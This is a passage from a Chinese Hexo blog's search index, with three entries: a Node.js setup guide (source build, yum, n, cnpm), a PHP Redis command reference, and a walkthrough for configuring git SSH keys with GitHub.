class="line">正文</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node环境搭建</title>
      <link href="/2018/11/08/node%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2018/11/08/node%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>这篇博文介绍了各种搭建node方法以及加速方案。其中极力推荐使用n进行版本管理，特别方便。而且在国内推荐使用cnpm来加速依赖安装，特别爽。</p><a id="more"></a><h2 id="node环境搭建"><a href="#node环境搭建" class="headerlink" title="node环境搭建"></a>node环境搭建</h2><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><h4 id="通过源码编译"><a href="#通过源码编译" class="headerlink" title="通过源码编译"></a>通过源码编译</h4><p><a href="https://nodejs.org/zh-cn/download/" target="_blank" rel="noopener">node下载地址</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> wget https://nodejs.org/dist/v10.13.0/node-v10.13.0.tar.gz</span><br><span class="line"><span class="meta">$</span> tar -zxvf node-v10.13.0.tar.gz</span><br><span class="line"><span class="meta">$</span> cd node-v10.13.0</span><br><span class="line"><span class="meta">$</span> make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><h4 id="通过安装包安装"><a href="#通过安装包安装" class="headerlink" title="通过安装包安装"></a>通过安装包安装</h4><p>根据系统环境以及选择安装包<a href="https://nodejs.org/zh-cn/download/" target="_blank" rel="noopener">node下载地址</a></p><h4 id="通过yum（CentOS）"><a href="#通过yum（CentOS）" class="headerlink" title="通过yum（CentOS）"></a>通过yum（CentOS）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> yum install -y nodejs</span><br></pre></td></tr></table></figure><p><br></p><h2 id="版本切换（通过npm）"><a href="#版本切换（通过npm）" class="headerlink" title="版本切换（通过npm）"></a>版本切换（通过npm）</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> npm i -g n</span><br><span class="line"><span class="meta">$</span> n 10         // 切换到v10</span><br></pre></td></tr></table></figure><h2 id="npm加速（cnpm）"><a href="#npm加速（cnpm）" class="headerlink" title="npm加速（cnpm）"></a>npm加速（cnpm）</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> npm i -g cnpm</span><br><span class="line"><span class="meta">$</span> cnpm i          // 使用cnpm 代表 npm命令</span><br></pre></td></tr></table></figure><h2 id="项目常规编译流程"><a href="#项目常规编译流程" class="headerlink" title="项目常规编译流程"></a>项目常规编译流程</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cd 项目目录</span><br><span class="line"><span class="meta">$</span> npm install</span><br><span class="line"><span class="meta">$</span> npm run build</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP Redis 使用教程</title>
      <link href="/2018/11/07/PHP-Redis-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2018/11/07/PHP-Redis-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>日常使用Redis的过程中发现搜到的文档对于使用方法、返回值这些都不是很全，因此写个文档整理在一起方便查找。除了比较难找的，后面会分配时间将常用的也不断补全。</p><a id="more"></a><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><h3 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h3><p>使用方法：$redis-&gt;connect($host, $port)<br>返回值：被移除key的数量<br>参数：<strong>host</strong>服务地址；  <strong>port</strong>端口号</p><p>用途：切换redis库<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br></pre></td></tr></table></figure></p><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p>使用方法：$redis-&gt;select($db_number)<br>返回值：被移除key的数量<br>参数：库对应的数值<br>用途：切换redis库<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">$redis-&gt;select(<span class="number">1</span>); <span class="comment">// 切换到1库</span></span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="键（KEY）"><a href="#键（KEY）" class="headerlink" title="键（KEY）"></a>键（KEY）</h2><h3 id="del"><a href="#del" class="headerlink" title="del"></a>del</h3><p>使用方法：$redis-&gt;del($key)<br>返回值：被移除key的数量<br>参数：可以是单个键或者键数组<br>用途：删除指定键（单个或者多个）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 单个删除</span></span><br><span class="line">$key = <span class="string">'test'</span>;</span><br><span class="line">$redis-&gt;del($key); <span class="comment">// 返回1，键不存在则返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 批量删除</span></span><br><span class="line">$key_array = [ <span class="string">'test1'</span>, <span class="string">'test2'</span>, <span class="string">'test3'</span> ];</span><br><span class="line">$result = $redis-&gt;del($key_array); <span class="comment">// 返回3</span></span><br></pre></td></tr></table></figure><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>使用方法：$redis-&gt;set($key, $value)<br>返回值：true | false<br>用途：设置键对应的值</p><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>使用方法：$redis-&gt;get($key)<br>返回值：键对应的值<br>用途：获取键对应的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$key = <span class="string">'name'</span>;</span><br><span class="line">$redis-&gt;set($key, <span class="string">'xiaoming'</span>);</span><br><span class="line">$redis-&gt;get($key); <span class="comment">// 返回 xiaoming</span></span><br></pre></td></tr></table></figure><h3 id="exists"><a href="#exists" class="headerlink" title="exists"></a>exists</h3><p>使用方法：$redis-&gt;exists($key)<br>返回值：true | false<br>用途：判断键是否存在</p><h3 id="setex"><a href="#setex" class="headerlink" title="setex"></a>setex</h3><p>使用方法：$redis-&gt;setex(‘key’, 3600, ‘value’);<br>用途：设置一小时超时时间</p><h3 id="setnx"><a href="#setnx" class="headerlink" title="setnx"></a>setnx</h3><p>使用方法：$redis-&gt;setnx(‘key’, ‘value’);<br>用途：将key的值设为value，当且仅当key不存在。 若给定的key已经存在，则SETNX不做任何动作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$result = $redis-&gt;setnx(&apos;key&apos;, &apos;value&apos;);</span><br><span class="line">var_dump($result);  // 首次设置键，返回true</span><br><span class="line">$result = $redis-&gt;setnx(&apos;key&apos;, &apos;value1&apos;);</span><br><span class="line">var_dump($result);  // 库内已存在键，返回false</span><br><span class="line">$result = $redis-&gt;get(&apos;key&apos;);</span><br><span class="line">var_dump($result);  // 返回 value</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="Hash（哈希表）"><a href="#Hash（哈希表）" class="headerlink" title="Hash（哈希表）"></a>Hash（哈希表）</h2><h3 id="hmset"><a href="#hmset" class="headerlink" title="hmset"></a>hmset</h3><p>使用方法：$redis-&gt;hmset($key, $value_array);<br>返回值：true | false<br>用途：给哈希表批量赋值（键值对）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$value_array = [</span><br><span class="line">      &apos;key1&apos; =&gt; &apos;value1&apos;,</span><br><span class="line">      &apos;key2&apos; =&gt; &apos;value2&apos;,</span><br><span class="line">      &apos;key3&apos; =&gt; &apos;value3&apos;,</span><br><span class="line">];</span><br><span class="line">$redis-&gt;hmset($key, $value_array); // 设置成功，返回true</span><br></pre></td></tr></table></figure></p><h3 id="hmget"><a href="#hmget" class="headerlink" title="hmget"></a>hmget</h3><p>使用方法：$redis-&gt;setex($key, $value_array);<br>用途：批量获取hash表的值，返回键值对，无键为false<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$value_array = [</span><br><span class="line">      &apos;key1&apos;,</span><br><span class="line">      &apos;key4&apos;,</span><br><span class="line">      &apos;key5&apos;,</span><br><span class="line">];</span><br><span class="line">$result = $redis-&gt;hmget($key, $value_array);</span><br><span class="line">var_dump($result);</span><br><span class="line"></span><br><span class="line">===== output =====</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [&quot;key1&quot;]=&gt;</span><br><span class="line">  string(6) &quot;value1&quot;</span><br><span class="line">  [&quot;key4&quot;]=&gt;</span><br><span class="line">  bool(false)   // 未设置键，返回false</span><br><span class="line">  [&quot;key5&quot;]=&gt;</span><br><span class="line">  bool(false)   // 未设置键，返回false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://redisdoc.com" target="_blank" rel="noopener">redis中文手册</a><br><a href="https://www.cnblogs.com/weafer/archive/2011/09/21/2184059.html" target="_blank" rel="noopener">PHP-redis中文文档</a><br><a href="https://www.cnblogs.com/weafer/archive/2011/09/21/2184059.html" target="_blank" rel="noopener">phpredis中文手册——《redis中文手册》 php版</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP Redis </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git管理密钥配置</title>
      <link href="/2018/11/03/git%E7%AE%A1%E7%90%86%E5%AF%86%E9%92%A5%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/11/03/git%E7%AE%A1%E7%90%86%E5%AF%86%E9%92%A5%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>这篇博文介绍了如何配置git密钥，并在github使用git密钥来进行远程连接鉴权。</p><a id="more"></a><h3 id="git下载"><a href="#git下载" class="headerlink" title="git下载"></a>git下载</h3><p><a href="https://git-scm.com/download/win" target="_blank" rel="noopener">下载地址</a></p><h3 id="git配置"><a href="#git配置" class="headerlink" title="git配置"></a>git配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name "你的GitHub用户名"</span><br><span class="line">git config --global user.email "你的GitHub注册邮箱"</span><br></pre></td></tr></table></figure><h3 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C "你的GitHub注册邮箱"</span><br><span class="line"></span><br><span class="line">Enter file in which to save the key          // 密钥保存位置，回车默认</span><br><span class="line">Enter passphrase (empty for no passphrase):  // 输入密码，直接回车</span><br><span class="line">Enter same passphrase again:                 // 输入确认密码，直接回车</span><br></pre></td></tr></table></figure><h3 id="github密钥管理"><a href="#github密钥管理" class="headerlink" title="github密钥管理"></a>github密钥管理</h3><p><a href="https://github.com/settings/keys" target="_blank" rel="noopener">github密钥管理直达链接</a><br>1）New SSH Key，复制本地 ~/.ssh（window下为 C:\User\用户.ssh）的 id_rsa.pub<br>2）Title为标题，任意填即可，将刚刚复制的id_rsa.pub内容粘贴进去<br>3）最后点击Add SSH key。</p><h3 id="检验"><a href="#检验" class="headerlink" title="检验"></a>检验</h3><p>在Git Bash中检测GitHub公钥设置是否成功，输入<br><code>ssh -T git@github.com</code></p><p><br></p><h3 id="为不同网站应用各自的-SSH-KEY"><a href="#为不同网站应用各自的-SSH-KEY" class="headerlink" title="为不同网站应用各自的 SSH KEY"></a>为不同网站应用各自的 SSH KEY</h3><p>编辑ssh配置 <code>vim ~/.ssh/config</code><br>追加以下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    HostName github.com</span><br><span class="line">    User git</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_a</span><br><span class="line"></span><br><span class="line">Host git.oschina.net</span><br><span class="line">    HostName git.oschina.net</span><br><span class="line">    User git</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_b</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
